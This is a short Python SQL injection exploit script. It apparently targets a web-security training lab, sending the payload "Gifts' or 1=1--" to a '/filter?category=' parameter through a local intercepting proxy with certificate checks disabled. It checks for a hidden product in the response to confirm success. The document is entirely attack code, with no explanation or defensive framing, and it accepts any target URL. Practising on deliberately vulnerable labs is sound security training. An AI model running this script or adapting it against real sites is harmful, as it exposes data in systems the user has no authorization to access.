import requests
import sys
import urllib3

#Disable warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


#Making requests go through the proxy
proxy = {'http': 'http://127.0.0.1:8080', 'https' : "http://127.0.0.1:8080"}

#Exploit Function
def exploit_executed(url, payload):
    uri = "/filter?category="
    request = requests.get(url + uri + payload, verify=False, proxies=proxy)
    #An item that only exists if exploit was successful (If this doesn't exist in your lab, change it)
    if "Adult Space Hopper" in request.text:
        return True
    else:
        return False


if __name__ == "__main__":
    #Insuring correct syntax
    try:
        url = sys.argv[1].strip()
        payload = "Gifts' or 1=1--"

    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        sys.exit(-1)

    #Checking if the exploit worked 
    if exploit_executed(url, payload):
        print("[+] Exploited Successfuly")
    else:
        print("[-] Something went wrong")